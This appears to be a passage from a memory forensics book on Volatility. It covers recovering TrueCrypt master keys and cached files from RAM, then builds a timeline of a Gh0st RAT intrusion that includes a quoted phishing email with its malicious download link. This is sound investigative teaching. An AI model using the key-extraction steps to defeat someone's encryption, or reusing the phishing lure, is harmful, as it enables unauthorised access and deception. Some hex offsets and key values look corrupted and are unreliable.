\Device\TrueCryptVolumeZ mounted 2013-10-11 03:51:08 UTC+0000
Symbolic Link     Volume{52b24c50-eb79-11e2-93eb-000c29e29398} -> 
\Device\TrueCryptVolumeR mounted 2013-10-11 03:55:13 UTC+0000
File Object       \Device\TrueCryptVolumeR\$Directory at 0x7c2c70f070
File Object       \Device\TrueCryptVolumeR\$LogFile at 0x7c39d750
File Object       \Device\TrueCryptVolumeR\$MftMirr at 0x7c67cd40
File Object       \Device\TrueCryptVolumeR\$Mft at 0x7cf05230
File Object       \Device\TrueCryptVolumeR\$Directory at 0x7cf50330
File Object       \Device\TrueCryptVolumeR\$BitMap at 0x7cfa7a00
Driver            \Driver\truecrypt at 0x7c9c0530 range 0xfffff88009200000 – 
0xfffff88009241000
Device            TrueCryptVolumeR at 0xfffffa801b4be080 type FILE_DEVICE_DISK
Container         Path: \Device\Harddisk1\Partition1
Device            TrueCrypt at 0xfffffa801ae3f500 type FILE_DEVICE_UNKNOWN
```

Although the partition is fully encrypted, once it is mounted, the operating system caches any files accessed on the volume (for more information, see the “Windows Cache Manager” section of this chapter), at least for some period of time. As a result, the `dumpfiles` plugin can help you recover all or part of unencrypted files from memory. The potential data sources include the pictures and Gmail chat logs shown in the previous example as well as the `$Mft`, `$MftMirr`, `$Directory`, and other NTFS metadata files in this example. Remember, the encryption is *transparent* to the operating system, so files that reside on protected media are cached in the same manner as all others.

### Extracting (AES) Master Keys

If a suspect does not cache passwords, you can go after the master keys. One of the inherent risks of disk encryption is that the master keys must remain in RAM *while the volume is mounted* to provide fully transparent encryption (see [http://www.truecrypt.org/docs/unencrypted-data-in-ram#Y445](http://www.truecrypt.org/docs/unencrypted-data-in-ram#Y445)). In other words, if master keys are flushed to disk, the design would suffer in terms of performance and security because plain-text keys are written to slower, less volatile storage. Thus, if physical memory acquisition occurs at a time when the encrypted volume(s) are mounted, you have a very good chance of recovering the master keys.

TrueCrypt’s *default* encryption scheme is AES in XTS mode. In XTS mode, primary and secondary 256-bit keys are combined to form one 512-bit (64 bytes) master key. Because AES key schedules can be distinguished from other seemingly random blocks of data, you can locate them in memory dumps, packet captures, and so on. For example, the following tools can locate AES keys in unstructured binary files:

- AESKeyFinder: [https://citp.princeton.edu/research/memory/code](https://citp.princeton.edu/research/memory/code)
- Bulk Extractor: [https://github.com/simsong/bulk_extractor](https://github.com/simsong/bulk_extractor)

In most cases, extracting the keys from RAM is as easy as this:

```
$ ./aeskeyfind Win8SP0x86.raw
f12bffe602366806d453b3b290f89429
e6f5e6511496b3db550cc4a00a4bdb1b
4d81111573a789169fce790f4f13a7bd
a2cde593dd1023d89851049b8474b9a0
[snip]
269493cfc103ee4ac7cb4dea937abb9b
4d81111573a789169fce790f4f13a7bd
0f2eb916e673c76b359a932ef2b81a4b
7a9df9a5589f1d85fb2dfc62471764ef47d00f35890c18f084d87c3a10d9eb5bf4
c78e679c9da3574f63965803a909b8ef40b140b43be062850d5bb95d75273e41
Keyfind progress: 100%
```

Several keys were identified, but only the two final ones in bold are 256-bits (the others are 128-bit keys). Thus, by combining the two 256-bit keys, you can bet you’ll have your 512-bit master AES key. That’s all straightforward and documented in the articles linked from the beginning of the “Defeating Disk Encryption” section. Additionally, Michael Weissbacher’s blog ([http://mweissbacher.com/blog/tag/truecrypt](http://mweissbacher.com/blog/tag/truecrypt)) includes a patch to the TrueCrypt source code that shows you how to leverage the extracted master keys to unlock the TrueCrypt container.

### Non-Default Encryption Algorithms

TrueCrypt also supports Twofish, Serpent, and combinations thereof (AES-Twofish, AES-Twofish-Serpent). Furthermore, it supports modes other than XTS, such as LWR and CBC. What do you do if a suspect uses non-default encryption schemes or modes? You can’t find Twofish or Serpent keys with tools like AESKeyFinder and Bulk Extractor, which are designed to scan only for AES keys. An alternative is Interrogate ([http://sourceforge.net/projects/interrogate](http://sourceforge.net/projects/interrogate)) by Carsten Maartmann-Moe. Interrogate scans for AES, Twofish, Serpent, and RSA keys based on patterns in the algorithms’ key schedules. Additionally, we identify several commercial products at the end of this section.

The method we recently devised for extracting TrueCrypt master keys from memory does not involve scanning for algorithm-specific key schedule patterns. Instead, the `truecryptmaster` Volatility plugin uses a structured approach by finding keys in the *exact same way* the TrueCrypt driver finds the keys before encrypting or decrypting data. We compiled our own `truecrypt.sys` and built Python types (see Chapter 3) from the PDB file generated by the Microsoft Visual Studio compiler. Then we configured the plugin to access the same structures and members as the TrueCrypt driver.

The following command shows how to use this plugin:

```
$ python vol.py -f WIN-QBTA4.raw --profile=Win2012SP0x64 
     truecryptmaster --dump-dir=OUTPUT

Volatility Foundation Volatility Framework 2.4

Container: \Device\Harddisk1\Partition1
Hidden Volume: No
Read Only: No
Disk Length: 7743733760 (bytes)
Host Length: 7743995904 (bytes)
Encryption Algorithm: SERPENT
Mode: XTS
Master Key
0xfffffa8018eb71a8 bbe1dc7a8e87e9f1f7eef37e6bb30a25   ...z.......~k..%
0xfffffa8018eb71b8 90b8948fefee425e5105054c32e058b1a7   ......B^Q..N2X..
0xfffffa8018eb71c8 a76c5e96d67892335008a8c60d09fb69   .l^..x.3P......i
0xfffffa8018eb71d8 efb0b5fc759d44ec8c057fbc94ec3cc9   ....u.D.......<.
Dumped 64 bytes to ./0xfffffa8018eb71a8_master.key
```

The suspect in this case used Serpent in XTS mode. In addition, the master key data is extracted to disk. As a result of the described methodology for finding and dumping keys, the plugin works regardless of the encryption algorithm, mode, key length, and so on. In short, if the TrueCrypt driver can find the keys, so can you. However, the main caveat is that you still need to acquire memory while the encrypted volume is accessible to the operating system.

---

**NOTE**

The following list shows commercially available products for defeating disk encryption with memory analysis. You typically supply a forensic disk image (or container) and a full memory dump. We have not used or evaluated these tools.

- Passware Kit Forensic: [http://www.lostpassword.com/kit-forensic.htm](http://www.lostpassword.com/kit-forensic.htm)
- Elcomsoft Forensic Disk Decryptor: [http://www.elcomsoft.com/efdd.html](http://www.elcomsoft.com/efdd.html)

 Additionally, various products (open source and commercial) can help you brute-force passwords. A few are as follows:- AccessData DNA: [http://www.accessdata.com/products/digital-forensics/decryption](http://www.accessdata.com/products/digital-forensics/decryption)
- TrueCrack: [https://code.google.com/p/truecrack](https://code.google.com/p/truecrack)

---

## Summary

Memory analysis complements disk forensics in powerful ways. It provides you with a corroborating source of evidence regarding files on the file system (MFT records) and their timestamps. Additionally, memory contains recently accessed file content, giving you the ability to dump any files cached by the operating system, detect memory-resident code modifications, and extract unencrypted portions of sensitive files on encrypted volumes. We still recommend acquiring forensic disk images (when possible); however, you’ll often find that a memory sample is all you need to gather the necessary evidence that has traditionally been available only via disk forensics.
# Chapter 17 Event Reconstruction

Reconstructing an event is a necessary step in most forensics investigations. Although you could probably pick any chapter in this book and say it facilitates correlations, triage, and so forth, extracting strings and recovering attacker command histories are two procedures that stand out as notably significant. Despite the fact that extracting strings is one of the most ancient forms of analysis, it’s still extremely powerful, especially when combined with the capability to add context (such as linking the strings with their owning process or kernel module).

This chapter shows you several ways to leverage strings to prove or disprove that certain actions took place on a system. You’ll also learn about the internals of the Windows command architecture that attackers frequently exploit to navigate the breached network, install or configure backdoors, mount shares, and so on. For example, if you use `cmd.exe` as an FTP client, you might find evidence that identifies the server, the attacker’s username and password, and the FTP commands—long after the actual network connections are torn down.

## Strings

As introduced in Chapter 2, a string is a sequence of bytes that contains human-readable characters. Although strings can exist in various encodings, the most common ones you’ll analyze are ASCII and Unicode. They are the encodings in which the Windows application programming interfaces (APIs) expect to receive their arguments. For example, `CreateFileA ...`
# Chapter 18  
 Timelining

A common phase of most digital investigations is organizing the analysis results to help construct theories about what happened. One technique that investigators have traditionally leveraged involves creating timelines to organize the data based on the temporal relationships between digital artifacts. This chapter demonstrates how you can combine digital artifacts extracted using memory analysis with artifacts from file system and network analysis to reconstruct a more complete understanding of the digital crime scene. Memory analysis often provides the context necessary to discover relationships between seemingly disparate events and artifacts. It also enables investigators to develop “temporal footprints” for rapidly identifying suspicious tools and techniques on a system.

This chapter explores these timelining techniques using a scenario that is frequently faced by modern digital investigators. It involves a targeted attack using the Gh0st remote access tool, in which the adversary attempts to move laterally within an organization to access sensitive data. The scenario begins with an alert about a host contacting an IP address associated with a known threat group. You must determine the extent of the compromise, evaluate the impact to the organization, and gain insights into how it occurred. To accomplish these tasks, you need to combine timelines across multiple machines and integrate temporal artifacts extracted from alternate sources. Finally, you must correlate your theories with the information extracted from the obfuscated command and control traffic.

## Finding Time in Memory

Temporal reconstruction of file system events has often been viewed as one of the most valuable techniques used in digital investigations. As a result, a variety of tools were built to automate the extraction of these artifacts from disk images. With the recent advancements in memory analysis, investigators are also beginning to take advantage of the temporal artifacts found within memory samples. As you learned in Chapter 16, it is even possible to extract temporal artifacts—typically found within the file system—directly from memory samples. By extracting data into the same common output formats that file system analysis tools typically use, such as the body file format (see [http://wiki.sleuthkit.org/index.php?title=Body_file](http://wiki.sleuthkit.org/index.php?title=Body_file)), it is possible to combine timelines from a variety of sources and across multiple systems.

### Timestamp Formats

The three main types of timestamps on Windows machines are summarized in the following list:

- `WinTimeStamp`: Also known as `FILETIME`, this is an 8-byte timestamp that represents the number of 100-nanosecond intervals since January 1, 1601 UTC (see [http://msdn.microsoft.com/en-us/library/windows/desktop/ms724284%28v=vs.85%29.aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/ms724284%28v=vs.85%29.aspx)). This is the most commonly used timestamp within Windows data structures.
- `UnixTimeStamp`: This 4-byte timestamp represents the number of seconds that have passed since January 1, 1970 UTC.
- `DosDate`: This is a 4-byte timestamp, also known as “MS-DOS Date,” that was used to store date and time information in MS-DOS files. There are still some file formats, such as shortcut files, and registry data, that use this timestamp.

---

**NOTE**

All timestamps in this chapter are in the UTC time zone unless otherwise stated.

---

### Timestamp Sources

A number of sources of temporal information are found in memory. The following list enumerates some of the most common and forensically useful ones. As with many of the other artifacts discussed throughout the book, these are typically never replicated to disk. As a result, they often provide valuable information to augment traditional disk-focused timelines.

- System time
- Process start and end times
- Thread start and end times
- Internet history URL access times
- Symbolic link creation times
- Registry key last-write times
- MFT entry timestamps (MAC times for standard information and filename information)
- UserAssist times
- Process working set trim times
- PE file compile time
- Library load times
- Socket and connection creation times
- Event log creation times
- Shimcache record times

## Generating Timelines

The primary steps for performing temporal reconstruction are extracting the temporal artifacts and generating timelines. Volatility provides a number of plugins for automatically extracting these artifacts from memory and formatting the data in a manner that facilitates the formation of timelines: `timeliner`, `mftparser` (covered in Chapter 16), and `shellbags` (covered in Chapter 10). The remainder of this chapter concentrates on generating timelines using these plugins. The chapter also discusses how to incorporate temporal artifacts from records stored in memory-mapped files (that is, log files, registry files, and so on) using the `dumpfiles` plugin and application-specific file parsing tools.

### Timeliner Plugin

This `timeliner` plugin was originally introduced at Open Memory Forensics Workshop (OMFW 2011). It was designed to help automate the process of extracting temporal artifacts from memory samples (see [http://gleeda.blogspot.com/2011/09/volatility-20-timeliner-registryapi.html](http://gleeda.blogspot.com/2011/09/volatility-20-timeliner-registryapi.html)). Although the default invocation of the `timeliner` plugin extracts *most* of the aforementioned temporal artifacts, some of the others require additional command-line options or alternative plugins. For example, you can include the registry timestamps by adding a `--registry` flag. You can extract the timestamps associated with Shellbags and the MFT using the `shellbags` and `mftparser` plugins, respectively. An added advantage of moving these extraction algorithms into separate plugins is that an investigator can run these plugins in parallel with the `timeliner` plugin in separate shells.

The following example shows how to create a timeline from temporal artifacts extracted from a memory sample using these three plugins. In this example, the data is extracted into the body file format. Each plugin is run separately and the output files are combined into a file named `largetimeline.txt`:

```
$ python vol.py –f VistaSP1x64.vmem --profile=VistaSP1x64 timeliner 
     --output-file=timeliner.txt --output=body

$ python vol.py –f VistaSP1x64.vmem --profile=VistaSP1x64 mftparser 
     --output-file=mft.txt --output=body
   
$ python vol.py –f VistaSP1x64.vmem --profile=VistaSP1x64 shellbags 
    --output-file=shellbags.txt --output=body

$ cat *.txt >> largetimeline.txt
```

As previously mentioned, you might also want to include temporal data from alternative sources, including file content, file system metadata, or network captures. In those circumstances, you can run a program, such as `log2timeline` ([https://code.google.com/p/log2timeline/](https://code.google.com/p/log2timeline/)), against the disk image or against files that have been extracted with the `dumpfiles` plugin (discussed in Chapter 16). `log2timeline` will attempt to extract temporal data from all supported files, such as event logs, registry files, Prefetch files, and Recycle Bin files. It is important to note that files extracted using the `dumpfiles` plugin are padded with zeros to account for nonresident pages, and that this padding may cause third-party processing tools to fail.

The following example demonstrates this process by using event logs from a Windows 7 SP1 64–bit machine. The log files were extracted from memory using the `dumpfiles` plugin and processed using `log2timeline`. The output is saved to the file `evtx.body`. The flags used for `log2timeline` are these:

- `-z`: Specifies the time zone (UTC).
- `-f`: File type being processed (`evtx`).
- `-name`: Machine identifier that differentiates between different machines or sources when you combine timelines.
- `-w`: Output file (in body file format). `$ python vol.py –f VistaSP1x64.vmem --profile=VistaSP1x64 dumpfiles -i -r evtx$ -D EVTX_OUTPUT $ find EVTX_OUTPUT -exec log2timeline -z UTC -f evtx '{}' -name Win7x64 -w evtx.body \;` You can leverage similar processes for extracting temporal artifacts from cached registry files (prior to Windows 7). You can process these files using a registry-parsing tool, such as `timeline.py` from the `python-registry` library ([https://github.com/williballenthin/python-registry](https://github.com/williballenthin/python-registry)). The following example illustrates how this is accomplished: `$ python vol.py –f VistaSP1x64.vmem --profile=VistaSP1x64 dumpfiles -i -r ntuser.dat$ -D REG_OUTPUT/ $ find REG_OUTPUT –exec python timeline.py --body ‘{}’ >> registry.body \;`

### Timeliner Output Formats

Because the `timeliner` plugin extracts an ever-expanding list of temporal artifacts, it also supports a number of different output options to facilitate easy integration with existing tools:

- `text`: Pipe-delimited output in the following format: *Date/Time | Type | Details*
- `xlsx`: Directly output into an Office 2007 Excel file format using the OpenPyxl library (see [https://bitbucket.org/ericgazoni/openpyxl/wiki/Home](https://bitbucket.org/ericgazoni/openpyxl/wiki/Home)). Items that are detected, such as hidden processes, hooked processes, Yara hits, and specified event log messages, are auto-highlighted. The columns are: *Time | Type | Item | Details | Reason*.
- `body`: Output compatible with the `mactime` utility from The Sleuth Kit (see [http://wiki.sleuthkit.org/index.php?title=Body_file](http://wiki.sleuthkit.org/index.php?title=Body_file)). This format is useful for combining timelines from different sources into one large timeline.
- `xml`: Output compatible with the Simile data-visualization framework created by MIT (see [http://simile-widgets.org/](http://simile-widgets.org/)).

---

**NOTE**

As mentioned earlier, all timestamps are in UTC by default. If you need output in a different time zone (for any Volatility plugin that has timestamp data), you can run Volatility with the `--tz` flag and the appropriate Olson time zone ([http://en.wikipedia.org/wiki/List_of_tz_database_time_zones](http://en.wikipedia.org/wiki/List_of_tz_database_time_zones)). The following shows an example for Eastern Time (EST):

```
$ python vol.py –f VistaSP1x64.vmem --profile=VistaSP1x64 
           timeliner –-tz America/New_York
```

---

### Processing Timelines Using Mactime

All the aforementioned output options of the `timeliner` plugin display timestamps in a human-readable format, except the body file format. In order to view the body file format correctly, you must use a parsing utility such as `mactime`([http://www.sleuthkit.org/sleuthkit/man/mactime.html](http://www.sleuthkit.org/sleuthkit/man/mactime.html)). The following example demonstrates the typical options passed to `mactime` and the subsequent output:

- The `–b` flag is used to specify the body file (`timeline.body`).
- The `–d` flag is used to make each line of the output comma delimited.
- The `–z` flag enables you to specify the time zone (UTC). `$ mactime –b timeline.body –d –z UTC Tue Nov 27 2012 01:45:46,336,macb,,0,0,12038,[MFT FILE_NAME] mdd.exe (Offset: 0x46c800) Tue Nov 27 2012 01:45:46,336,.acb,,0,0,12038,[MFT STD_INFO] mdd.exe (Offset: 0x46c800) Tue Nov 27 2012 01:45:51,0,m...,,0,0,0,[THREAD] lsass.exe PID: 696/TID: 1768 [snip]`

Aspects of the output have been highlighted to emphasize their importance. The first field presents the human readable date and time associated with the event, and the third field indicates what type of timestamp is being presented:

- **m:** Modified time
- **a:** Access time
- **c:** Creation time
- **b:** MFT modified time (relevant only to MFT entries)

For the first line, all four timestamps (denoted by `macb`) for the `$FILE_NAME` attribute are `Tue Nov 27 2012 01:45:46`. In the second line, only the access, creation, and MFT modified time (`.acb`) timestamps are `Tue Nov 27 2012 01:45:46`. You can most likely find the missing modified time (denoted with a period) somewhere else in the timeline. This often is an indication that the file was modified sometime after it was created.

The last line contains the “modified” time for a running thread in `lsass.exe`. Note that some objects, such as processes and threads, that are found *only* in memory have at most two timestamps (creation time and exit time). Thus, the creation time is denoted as `.acb`, and the exit time is denoted as `m`, followed by three periods. This way, you can easily track when such objects were created and when they exited without deviating from the standard body file format convention.

### Where to Begin

Once you have extracted the temporal artifacts and have the data in the appropriate format, you are ready to use the timeline as a tool to support or confirm your analysis efforts. For example, you can start with a specific event on which to focus your analysis, or you might discover temporal anomalies associated with one of the following artifacts:

- **Prefetch files:** Because malware has to run on a machine, and its execution results in the creation of a Prefetch file, this is often a good starting point. One thing to note, however, is that some operating systems (such as Windows 2003, 2008, and 2012) disable Prefetch by default. Also, Windows 7 machines running on SSD drives often have Prefetching disabled by default to save the life of the SSD ([http://blogs.msdn.com/b/e7/archive/2009/05/05/support-and-q-a-for-solid-state-drives-and.aspx](http://blogs.msdn.com/b/e7/archive/2009/05/05/support-and-q-a-for-solid-state-drives-and.aspx)).
- **Shimcache registry keys:** These keys, like the Prefetch files, show when programs were executed on the machine. You can find these entries on all Windows systems and they are a good backup for machines that have Prefetching disabled.
- **Creation of unknown executables:** Attackers often drop their own tools onto a machine, which results in new files appearing in the timeline. Therefore, it might be worthwhile to search for newly created executable files. This is easy to do if you have a baseline of known executables to use for comparison. Otherwise, if you know the approximate timeframe of when the attacker was on the machine, you could also use this to help narrow your search.
- **Network activity:** Sometimes attackers install back doors, which can result in an open socket on the machine. Likewise, malware often connects back to the attacker or command and control sites. Because sockets have a create time associated with them, you could look for artifacts of these listening sockets and remote connections.
- **Job files:** Attackers often create Job files using the `at` command to run a program at a later time. Because Job files are often named `At#.job` (where the `#` is replaced by a number), you could search for evidence of these files being created and use that as your starting point.
- **Registry keys:** Many activities performed on a machine involve accessing, creating, or modifying registry keys, such as logging in, starting services, accessing files, accessing network shares, creating mount points, and so on. Thus, you can search for such changes in the registry and use them as your starting point in the timeline.

## Gh0st in the Enterprise

The best way to explore these tools and techniques is to discuss them in the context of a common scenario associated with modern threat groups. The data being used in this scenario was created for a forensics challenge hosted by Jack Crook ([https://docs.google.com/file/d/0B_xsNYzneAhEN2I5ZXpTdW9VMGM/edit](https://docs.google.com/file/d/0B_xsNYzneAhEN2I5ZXpTdW9VMGM/edit)). The scenario involves an organization that is the victim of a targeted attack, in which the adversaries were moving laterally between multiple machines. The investigation was initiated because an IDS alert flagged suspicious traffic from an internal host, `ENG-USTXHOU-148`, to an IP address typically associated with targeted attacks (`58.64.132.141`).

The remainder of this chapter will focus on analyzing the data collected from the following three machines, as well as the associated packet capture (`jackcr-challenge.pcap`):

- `ENG-USTXHOU-148`: 172.16.150.20 / WinXPSP3x86
- `FLD-SARIYADH-43`: 172.16.223.187 / WinXPSP3x86
- `IIS-SARIYADH-03`: 172.16.223.47 / Win2003SP0x86

The first step of this investigation involves extracting the temporal artifacts and generating the timelines. You can leverage similar steps as previously described in the “Timeliner Plugin” section. However, in this case, the ultimate goal is to combine the timelines from all machines into one. Thus, you should use the `--machine` option when running each of the Volatility plugins. This option adds the supplied string to the header so that you can easily associate events with their system of origin. The following example shows how to create timelines for one of these machines (`IIS-SARIYADH-03`). The command-line options passed to the `mftparser` plugin also extract MFT-resident files to a specified output directory. You should subsequently apply the same methodology to the other systems:

```
$ python vol.py –f IIS-SARIYADH-03/memdump.bin 
     mftparser --profile=Win2003SP0x86 
     --output=body -D IIS_FILES --machine=IIS 
     --output-file=challenge/IIS_mft.body

$ python vol.py –f IIS-SARIYADH-03/memdump.bin 
     timeliner --profile=Win2003SP0x86 
     --output=body --machine=IIS 
     --output-file=challenge/IIS_timeliner.body

$ python vol.py –f IIS-SARIYADH-03/memdump.bin 
     shellbags --profile=Win2003SP0x86 
     --output=body --machine=IIS 
     --output-file=challenge/IIS_shellbags.body
```

In this example, the memory sample (`memdump.bin`) is found in a folder based on its machine name, and the output for the commands will be written to a folder named `challenge`.

#### Scripting Registry Timelines

The following bash script demonstrates how to extract the memory-resident registry hives and parse them with `timeline.py`:

```
  1 for j in FLD-SARIYADH-43 ENG-USTXHOU-148
  2 do
  3     file=challenge/$j/memdump.bin
  4     loc=challenge/REG/$j
  5     short=`echo $j |cut -d\- -f1`
  6     mkdir -p $loc
  7 
  8     for i in config.system config.security config.sam \
  9     config.default config.software ntuser.dat usrclass.dat
 10     do
 11         echo python vol.py -f $file dumpfiles -i -r $i\$ -D $loc 
 12         python vol.py -f $file dumpfiles -i -r $i\$ -D $loc 
 13     done
 14     find $loc -type f -exec python timeline.py \
 15         --body '{}' >> $loc.temp \;
 16     cat $loc.temp |sed "s/\[Registry None/\[$short Registry/" \
 17         >> $loc.registry.body
 18     rm $loc.temp    
 19 done
```

Line 1 loops through the two machine names that are both of the same profile (WinXPSP3x86) to process each memory sample. Lines 3–6 set up the variables for the memory file, output directory, and short name (the alias added to the registry timeline to distinguish between machines) and then creates the output directory, if it does not exist. Lines 8–13 loop through each of the registry filenames and dumps them using the `dumpfiles` plugin with case-insensitive (`-i`) and `–r/--regex` options. Lines 14–18 create the registry timeline for all registry files that were dumped.

#### Adding Packet Capture Data

As previously mentioned, you can use `log2timeline` to create a timeline from the data found in the packet capture. In this instance, you do not specify a machine name. Because all acquired timestamps are in UTC, you need to specify the time zone when using `log2timeline` to make sure they are all consistent:

```
$ log2timeline -f pcap -z UTC jackcr-challenge.pcap -w pcap.body
```

After the timeline data has been generated, you can easily combine the timeline files associated with each host and begin the preliminary host-specific components of the investigation:

```
$ cat ENG*.body REG/ENG*.body >> ENG_all
$ cat IIS*.body REG/IIS*.body >> IIS_all
$ cat FLD*.body REG/FLD*.body >> FLD_all
```

---

**NOTE**

To condense the output from the timelines, these machines are referenced by a short name that consists of the first three characters of their hostnames:

- **ENG:** Short name for `ENG-USTXHOU-148`
- **FLD:** Short name for `FLD-SARIYADH-43`
- **IIS:** Short name for `IIS-SARIYADH-03`

---

### Finding the Initial Infection Vector

After you create the timelines for each machine, you are ready to begin analysis. Given the often overwhelming volume of temporal data, you should have a starting point to focus your attention. We recommend first looking into the machine that exhibited the suspicious behavior and searching for activity patterns and time ranges that you can use as you expand the scope of the investigation. In this case, it would be the `ENG-USTXHOU-148` (ENG) machine because that’s what triggered the IDS alert. To confirm that you’re working with the correct machine, you can run the `connscan` plugin. In the following output, you will notice a connection to the malicious IP address. It also helps establish what process is involved (PID 1024):

```
$ python vol.py –f ENG-USTXHOU-148/memdump.bin connscan
Volatility Foundation Volatility Framework 2.4
Offset(P)  Local Address             Remote Address            Pid
---------- ------------------------- ------------------------- ---
0x01f60850 0.0.0.0:0                 1.0.0.0:0                 36569092
0x01ffa850 172.16.150.20:1291        58.64.132.141:80          1024
0x0201f850 172.16.150.20:1292        172.16.150.10:445         4
0x02084e68 172.16.150.20:1281        172.16.150.10:389         628
0x020c89f088 172.16.150.20:2862        172.16.150.10:135         696
0x02201008 172.16.150.20:1280        172.16.150.10:389         628
0x18615850 172.16.150.20:1292        172.16.150.10:445         4
0x189c88e050 172.16.150.20:1291        58.64.132.141:80          1024
[snip]
```

#### Tracking Executed Programs

As previously mentioned, Prefetch files are created on the system when applications execute. Therefore, a reasonable next step is to look for suspicious Prefetch files. In the following output, you can see how `grep` is used to find Prefetch files within the timeline data.

```
$ grep -i pf ENG_all |grep -i exe | 
           cut -d\| -f2 
[snip]
[MFT FILE_NAME] WINDOWS\Prefetch\NET.EXE-01A53C2F.pf (Offset: 0x12d588)
[MFT FILE_NAME] WINDOWS\Prefetch\SL.EXE-010E2A23.pf (Offset: 0x311400)
[MFT FILE_NAME] WINDOWS\Prefetch\GS.EXE-3796DDD9.pf (Offset: 0x311800)
[MFT FILE_NAME] WINDOWS\Prefetch\PING.EXE-31216D26.pf (Offset: 0x311c00)
[MFT FILE_NAME] WINDOWS\Prefetch\PS.EXE-09745CC1.pf (Offset: 0x924e400)
[MFT FILE_NAME] WINDOWS\Prefetch\AT.EXE-2770DD18.pf (Offset: 0x12ab2400)
[MFT FILE_NAME] WINDOWS\Prefetch\WC.EXE-06BFE764.pf (Offset: 0x12ab2c00)
[MFT FILE_NAME] WINDOWS\Prefetch\SYMANTEC-1.43-1[2].EXE-3793B625.pf 
    (Offset: 0x17779800)
```

By reviewing the output, you might notice that a few of the Prefetch files stand out. From these artifacts, it appears that some suspicious-looking executables have run on the system, such as `SL.EXE`, `GS.EXE`, `PS.EXE` and `SYMANTEC-1.43-1[2].EXE`. The `SYMANTEC-1.43-1[2].EXE` executable is particularly troubling because its naming convention is similar to those typically associated with files that have been downloaded from the Internet (due to the `[2]`). You can also see possible indications of network reconnaissance (`NET.EXE` and `PING.EXE`) and job scheduling (`AT.EXE`). You now have a few items to examine within the context of the timeline.

To put things in chronological order, you can leverage the `mactime` utility. The following command shows how to examine the timeline for the `ENG-USTXHOU-148` machine in this manner.

```
$ mactime -b ENG_all -d -z UTC 
```

Because you suspect that the `SYMANTEC-1.43-1[2].EXE` executable might be something of interest, you can search for it in the timeline. If you search for “symantec” (case insensitive), you find the following artifact associated with Internet Explorer, as well as the Prefetch file showing it was run one second after it was downloaded (`Nov 26 2012 23:01:54`). This helps confirm your theories about how the executable was introduced to the system.

```
Mon Nov 26 2012 23:01:53,macb,[ENG IEHISTORY] explorer.exe->Visited: 
    callb@http://58.64.132.8/download/Symantec-1.43-1.exe 
    PID: 284/Cache type "URL " at 0x2895000
[snip]
Mon Nov 26 2012 23:01:54,macb,[ENG MFT FILE_NAME] WINDOWS\Prefetch\
    SYMANTEC-1.43-1[2].EXE-3793B625.pf (Offset: 0x17779800)
```

#### Phishing E-mail Artifacts

If you use the `strings` utility on the memory sample (see Chapter 17), you can also find the phishing e-mail that contains the previously shown link. Now you know how the executable arrived on the system:

```
Mon, 26 Nov 2012 14:00:08 -0600
Received: from d0793h (d0793h.petro-markets.info [58.64.132.141])
     by ubuntu-router (8.14.3/8.14.3/Debian-9.2ubuntu1) with SMTP id 
     qAQK06Co005842;
     Mon, 26 Nov 2012 15:00:07 -0500
Message-ID: <FCE1C36C7BBC46AFB7C2A251EA868B8B@d0793h>
From: “Security Department” <isd@petro-markets.info>
To: <amirs@petro-market.org>, <callb@petro-market.org>,
        <wrightd@petro-market.org>
Subject: Immediate Action
Date: Mon, 26 Nov 2012 14:59:38 -0500

[snip]

Attn: Immediate Action is Required!!
The IS department is requiring that all associates update to the new =
version of anti-virus.  This is critical and must be done ASAP!  Failure =
to update anti-virus may result in negative actions.
Please download the new anti-virus and follow the instructions.  Failure =
to install this anti-virus may result in loosing your job!
Please donwload at http://58.64.132.8/download/Symantec-1.43-1.exe
Regards,
The IS Department
```

#### Examining the 6to4 Service

If you look for other events in close temporal proximity, you may also notice some suspicious registry changes. A new service named `6to4` was added at the same time (`23:01:54`) as the `SYMANTEC-1.43-1[2].EXE` executable was run:

```
Mon Nov 26 2012 23:01:54,.a..,[ENG Registry] 
$$$PROTO.HIV\ControlSet001\Enum\Root\LEGACY_6TO4
Mon Nov 26 2012 23:01:54,.a..,[ENG Registry] 
$$$PROTO.HIV\ControlSet001\Enum\Root\LEGACY_6TO4\0000
Mon Nov 26 2012 23:01:54,.a..,[ENG Registry] 
$$$PROTO.HIV\ControlSet001\Services\6to4\Parameters
Mon Nov 26 2012 23:01:54,.a..,[ENG Registry] 
$$$PROTO.HIV\ControlSet001\Services\6to4\Security
```

You can use the `printkey` plugin to examine the contents of these keys. For example, if you print out the `ControlSet001\Services\6to4` key, you see the new service is run inside an instance of `svchost.exe`:

```
$ python vol.py –f ENG-USTXHOU-148/memdump.bin printkey 
    -K "ControlSet001\Services\6to4"
Volatility Foundation Volatility Framework 2.4
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \Device\HarddiskVolume1\WINDOWS\system32\config\system
Key name: 6to4 (S)
Last updated: 2012-11-26 23:01:55 UTC+0000

Subkeys:
  (S) Parameters
  (S) Security
  (V) Enum

Values:
REG_DWORD     Type            : (S) 288
REG_DWORD     Start           : (S) 2
REG_DWORD     ErrorControl    : (S) 1
REG_EXPAND_SZ ImagePath       : (S) %SystemRoot%\System32\svchost.exe -k netsvcs
REG_SZ        DisplayName     : (S) Microsoft Device Manager
REG_SZ        ObjectName      : (S) LocalSystem
REG_SZ        Description     : (S) Service Description
```

Unfortunately, `svchost.exe` is just a generic host process for DLLs, so this information alone isn’t enough to take your analysis to the next stage. However, if you examine the `ControlSet001\Services\6to4\Parameters` key, you’ll see what DLL is being used for this service:

```
$ python vol.py –f ENG-USTXHOU-148/memdump.bin printkey 
     -K "ControlSet001\Services\6to4\Parameters"
Volatility Foundation Volatility Framework 2.4
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \Device\HarddiskVolume1\WINDOWS\system32\config\system
Key name: Parameters (S)
Last updated: 2012-11-26 23:01:54 UTC+0000

Subkeys:

Values:
REG_EXPAND_SZ ServiceDll      : (S) C:\WINDOWS\system32\6to4ex.dll
```

The filename (`6to4ex.dll`) looks suspicious, and examining the timeline for events that happened in close temporal proximity to events associated with this file further confirms these suspicions. Notice that the DLL was accessed on the system at the same time the registry key was modified:

```
Mon Nov 26 2012 23:01:54,.ac.,[MFT FILE_NAME] WINDOWS\system32\6to4ex.dll 
    (Offset: 0x324c800)
Mon Nov 26 2012 23:01:54,.ac.,[MFT STD_INFO] WINDOWS\system32\6to4ex.dll 
    (Offset: 0x324c800)
```

Several `svchost.exe` threads were started after this service was created, which is all consistent with what you would expect to happen when the service starts (for example, the host process launches new threads that access the DLL to load it in memory). Notice that the PID of the service (1024) is the same as the PID you saw previously in the `connscan` output for the process that was connected to the malicious IP address:

```
